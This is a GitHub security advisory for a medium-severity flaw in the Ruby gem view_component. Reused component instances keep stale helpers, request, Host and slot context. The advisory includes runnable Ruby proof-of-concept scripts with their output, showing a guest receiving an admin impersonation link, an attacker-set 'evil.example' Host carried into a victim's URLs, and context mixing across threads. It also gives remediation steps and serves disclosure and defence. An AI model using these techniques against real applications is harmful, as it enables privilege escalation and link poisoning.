# [M] ViewComponent: Reused Component Instances Retain Stale Render Context

## Summary
Severity: Medium
Advisory: GHSA-9h85-g7w3-rh49
CVE: CVE-2026-54497
CWE: CWE-362, CWE-488, CWE-668
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-9h85-g7w3-rh49
Type: github-advisory

## Affected
- RubyGems: `view_component` — affected >=4.0.0 <4.12.0

## Details
# Reused Component Instances Retain Stale Render Context

## Summary

`ViewComponent::Base` instances retain multiple render-scoped objects across calls to `render_in`. If the same component, collection, or spacer component instance is reused across requests, users, tenants, or threads, later renders can use stale `helpers`, `controller`, `request`, `view_flow`, format/variant details, and slot child context from an earlier render.

This can cause authorization-aware components to render privileged UI for a lower-privileged user, generate links using a stale Host header, leak slot/helper state, and mix request context under concurrent rendering.

## Severity

The PoC demonstrates cross-user authorization impact in a realistic downstream application pattern.
If the receiving program accepts downstream cross-user authorization impact as a scope-changing impact for a framework vulnerability, an alternative High score can be assigned:

Alternative CVSS: 8.2
Alternative vector: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N`

## Affected Code

Validated against:

- Repository commit: `eea79445`
- Ruby: `3.4.9`

Relevant locations:

- `lib/view_component/base.rb`
  - `render_in`
  - `controller`
  - `helpers`
  - `__vc_request`
- `lib/view_component/slot.rb`
  - `Slot#to_s`
- `lib/view_component/slotable.rb`
  - slot storage in `@__vc_set_slots`
- `lib/view_component/collection.rb`
  - child component memoization and spacer rendering

Key retained state:

```ruby
@view_context = view_context
self.__vc_original_view_context ||= view_context
@lookup_context ||= view_context.lookup_context
@view_flow ||= view_context.view_flow
@__vc_requested_details ||= @lookup_context.vc_requested_details
```

```ruby
@__vc_controller ||= view_context.controller
@__vc_helpers ||= __vc_original_view_context || controller.view_context
@__vc_request ||= controller.request if controller.respond_to?(:request)
```

Slot children also inherit the parent original view context:

```ruby
@__vc_component_instance.__vc_original_view_context = @parent.__vc_original_view_context
```

Collections memoize child component instances:

```ruby
return @components if defined? @components
```

## Root Cause

Component instances are mutable render objects. `render_in` updates some per-render fields, but many request-scoped values are memoized using `||=` or stored for later slot/collection rendering.

There is no runtime guard preventing a component instance from being rendered multiple times under different view contexts, and there is no full reset of render-scoped state at the start of each render.

Maintainer discussion in prior PRs notes that component instances should not be shared between renders, but the current runtime does not enforce this invariant.

## Proof of Concept

The following PoC demonstrates four independent effects:

- stale authorization gate
- stale Host/request data in generated absolute URLs
- stale slot child context
- cross-thread context mixing

Run from the repository root:

```ruby
$LOAD_PATH.unshift File.expand_path("lib", Dir.pwd)
require "action_controller/railtie"
require "rack/mock"
require "view_component/base"

class ReusePocController < ActionController::Base
  helper_method :current_user, :admin?
  attr_accessor :current_user, :role
  def admin? = role == :admin
end

routes = ActionDispatch::Routing::RouteSet.new
routes.draw { get "/accounts/:id", to: "accounts#show" }
ReusePocController.include routes.url_helpers

class AdminPanelComponent < ViewComponent::Base
  def render? = helpers.admin?

  def call
    href = helpers.url_for(controller: "accounts", action: "show", id: 42, only_path: false)
    "ADMIN user=#{helpers.current_user};host=#{request.host};href=#{href}".html_safe
  end
end

class UrlOnlyComponent < ViewComponent::Base
  def call
    href = helpers.url_for(controller: "accounts", action: "show", id: 42, only_path: false)
    "user=#{helpers.current_user};host=#{request.host};href=#{href}".html_safe
  end
end

class SlotChildComponent < ViewComponent::Base
  def call = "child_user=#{helpers.current_user};child_path=#{request.path}".html_safe
end

class SlotParentComponent < ViewComponent::Base
  renders_one :child, SlotChildComponent
  def call = "parent_user=#{helpers.current_user};parent_path=#{request.path};".html_safe + child.to_s
end

class RaceComponent < ViewComponent::Base
  def before_render = sleep 0.05
  def call = "#{helpers.current_user}@#{request.path}".html_safe
end

def vc(user:, role:, path:, host: "app.example")
  c = ReusePocController.new
  c.current_user = user
  c.role = role
  c.set_request!(ActionDispatch::Request.new(Rack::MockRequest.env_for(path, "HTTP_HOST" => host)))
  c.set_response!(ActionDispatch::Response.new)
  c.view_context
end

admin_vc = vc(user: "alice", role: :admin, path: "/admin", host: "admin.example")
guest_vc = vc(user: "bob", role: :guest, path: "/guest", host: "app.example")

panel = AdminPanelComponent.new
puts "auth_admin_first=#{panel.render_in(admin_vc)}"
puts "auth_guest_reused=#{panel.render_in(guest_vc)}"
puts "auth_guest_fresh=#{AdminPanelComponent.new.render_in(guest_vc).inspect}"

url = UrlOnlyComponent.new
puts "host_attacker_prime=#{url.render_in(vc(user: "attacker", role: :guest, path: "/prime", host: "evil.example"))}"
puts "host_victim_reused=#{url.render_in(vc(user: "victim", role: :guest, path: "/account", host: "app.example"))}"
puts "host_victim_fresh=#{UrlOnlyComponent.new.render_in(vc(user: "victim", role: :guest, path: "/account", host: "app.example"))}"

parent = SlotParentComponent.new
puts "slot_admin_first=#{parent.render_in(admin_vc) { |p| p.with_child }}"
puts "slot_guest_reused=#{parent.render_in(guest_vc) { |p| p.with_child }}"
puts "slot_guest_fresh=#{SlotParentComponent.new.render_in(guest_vc) { |p| p.with_child }}"

race = RaceComponent.new
q = Queue.new
t1 = Thread.new { q << [:admin, race.render_in(vc(user: "admin", role: :admin, path: "/admin"))] }
t2 = Thread.new { q << [:guest, race.render_in(vc(user: "guest", role: :guest, path: "/guest"))] }
t1.join
t2.join
results = 2.times.map { q.pop }.to_h
puts "race_admin_thread=#{results[:admin]}"
puts "race_guest_thread=#{results[:guest]}"
```

Observed output:

```text
auth_admin_first=ADMIN user=alice;host=admin.example;href=http://admin.example/accounts/42
auth_guest_reused=ADMIN user=alice;host=admin.example;href=http://admin.example/accounts/42
auth_guest_fresh=""

host_attacker_prime=user=attacker;host=evil.example;href=http://evil.example/accounts/42
host_victim_reused=user=attacker;host=evil.example;href=http://evil.example/accounts/42
host_victim_fresh=user=victim;host=app.example;href=http://app.example/accounts/42

slot_admin_first=parent_user=alice;parent_path=/admin;child_user=alice;child_path=/admin
slot_guest_reused=parent_user=alice;parent_path=/admin;child_user=alice;child_path=/guest
slot_guest_fresh=parent_user=bob;parent_path=/guest;child_user=bob;child_path=/guest

race_admin_thread=admin@/guest
race_guest_thread=admin@/guest
```

## Authorization-Impact PoC

The following PoC models a realistic downstream application pattern: a shared component registry caches component objects instead of caching component classes, factories, or rendered strings. An admin request primes the cached toolbar component. A later guest request renders the same cached object.

The component uses `render?` as an authorization-aware visibility gate and emits a representative privileged action link.

```ruby
$LOAD_PATH.unshift File.expand_path("lib", Dir.pwd)
require "action_controller/railtie"
require "rack/mock"
require "view_component/base"

module SharedComponentRegistry
  def self.admin_toolbar
    @admin_toolbar ||= AdminToolbarComponent.new
  end

  def self.reset!
    remove_instance_variable(:@admin_toolbar) if defined?(@admin_toolbar)
  end
end

User = Struct.new(:id, :role, keyword_init: true) do
  def admin? = role == :admin
end

class AppController < ActionController::Base
  helper_method :current_user, :admin?
  attr_accessor :current_user

  def admin?
    current_user&.admin?
  end
end

routes = ActionDispatch::Routing::RouteSet.new
routes.draw do
  get "/admin/users/:id/impersonate", to: "admin/users#impersonate", as: :impersonate_admin_user
end
AppController.include routes.url_helpers

class AdminToolbarComponent < ViewComponent::Base
  def render?
    helpers.admin?
  end

  def call
    helpers.link_to(
      "Impersonate user 42",
      helpers.impersonate_admin_user_url(42, host: request.host),
      data: { turbo_method: :post }
    )
  end
end

class DashboardController < AppController
  def render_dashboard_with_shared_component
    render_to_string(inline: '<main><h1>Dashboard</h1><%= render SharedComponentRegistry.admin_toolbar %></main>')
  end

  def render_dashboard_with_fresh_component
    render_to_string(inline: '<main><h1>Dashboard</h1><%= render AdminToolbarComponent.new %></main>')
  end
end

def controller_for(user:, host:, path: "/dashboard")
  c = DashboardController.new
  c.current_user = user
  c.set_request!(ActionDispatch::Request.new(Rack::MockRequest.env_for(path, "HTTP_HOST" => host)))
  c.set_response!(ActionDispatch::Response.new)
  c
end

SharedComponentRegistry.reset!
admin = User.new(id: 1, role: :admin)
guest = User.new(id: 2, role: :guest)

admin_response = controller_for(user: admin, host: "admin.example").render_dashboard_with_shared_component
guest_reused_response = controller_for(user: guest, host: "app.example").render_dashboard_with_shared_component
guest_fresh_response = controller_for(user: guest, host: "app.example").render_dashboard_with_fresh_component

puts "admin_shared_contains_admin_link=#{admin_response.include?('/admin/users/42/impersonate')}"
puts "guest_reused_contains_admin_link=#{guest_reused_response.include?('/admin/users/42/impersonate')}"
puts "guest_fresh_contains_admin_link=#{guest_fresh_response.include?('/admin/users/42/impersonate')}"
puts "guest_reused_contains_admin_host=#{guest_reused_response.include?('http://admin.example/admin/users/42/impersonate')}"
puts "guest_reused_response=#{guest_reused_response.gsub(/\s+/, ' ').strip}"
puts "guest_fresh_response=#{guest_fresh_response.gsub(/\s+/, ' ').strip.inspect}"
```

Observed output:

```text
admin_shared_contains_admin_link=true
guest_reused_contains_admin_link=true
guest_fresh_contains_admin_link=false
guest_reused_contains_admin_host=true
guest_reused_response=<main><h1>Dashboard</h1><a data-turbo-method="post" href="http://admin.example/admin/users/42/impersonate">Impersonate user 42</a></main>
guest_fresh_response="<main><h1>Dashboard</h1></main>"
```

This confirms a cross-user authorization impact in a realistic pattern: a guest receives privileged UI that a fresh component correctly suppresses. It also confirms stale request and Host context in the generated privileged URL.

## Exploit Scenario

A downstream app stores component instances in a constant, singleton service, memoized helper, cache object, or shared collection builder to avoid allocation. An attacker or lower-privileged user later triggers rendering of that same object.

Potential real-world examples:

- A navigation/sidebar component checks `helpers.admin?` in `render?`.
- A tenant switcher uses `request.host` or `current_user.account`.
- A component emits absolute URLs or signed action links.
- A table uses slot child components that rely on helper/request state.
- A global UI registry stores instantiated spacer or child components.

In these cases, a component first rendered under an admin or attacker-controlled request can affect later renders for other users.

## Impact

Confirmed impact classes:

- stale privileged UI rendering
- stale user identity through `helpers`
- stale Host/request data in generated absolute URLs
- slot child context inheritance
- cross-thread context corruption
- stale format/variant template selection
- stale `view_flow` / `content_for` writes
- collection and spacer component context leakage

This can chain into privilege escalation if an application relies on UI visibility as an authorization boundary. It can also leak signed links, tenant-specific URLs, admin actions, or user-specific data.

## Preconditions

- The same component, collection, slot, or spacer component instance is reused across render contexts.
- The component reads request-scoped or user-scoped APIs such as `helpers`, `controller`, `request`, URL helpers, `render?`, `before_render`, slots, variants, formats, or `content_for`.
- Higher impact when the shared object crosses users, tenants, roles, or threads.

Normal per-request usage such as `render(MyComponent.new(...))` is not affected.

## Chaining Potential

This issue can chain with:

- UI-only authorization checks
- signed admin links embedded in components
- Host header poisoning
- multi-tenant routing based on host/subdomain
- shared component registries
- fragment/component caching patterns that cache objects rather than rendered strings
- concurrent Rails servers such as Puma

The framework alone does not directly prove account takeover, but downstream applications can reach high impact if stale component output exposes privileged action links or bypasses server-side authorization assumptions.

## Remediation

The safest fix is to make component and collection instances one-shot renderables.

Recommended options:

1. Add a runtime guard in `render_in` that raises or warns when the same component instance is rendered again with a different `view_context`.
2. Reset render-scoped ivars at the beginning of every render, including:
   - `__vc_original_view_context`
   - `@lookup_context`
   - `@view_flow`
   - `@__vc_requested_details`
   - `@__vc_controller`
   - `@__vc_helpers`
   - `@__vc_request`
3. Rebuild `ViewComponent::Collection` child component instances per render or document/enforce collections as one-shot.
4. Avoid accepting a reusable instantiated `spacer_component`, or reset/clone it before rendering.
5. Add thread-safety tests for concurrent rendering of a shared instance.

## References
- https://github.com/ViewComponent/view_component/security/advisories/GHSA-9h85-g7w3-rh49
- https://github.com/ViewComponent/view_component/commit/7b05073be28037f7d5ff141e9dd42f3cf47956a4
- https://github.com/ViewComponent/view_component
- https://github.com/ViewComponent/view_component/releases/tag/v4.12.0
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/view_component/CVE-2026-54497.yml
- https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54497
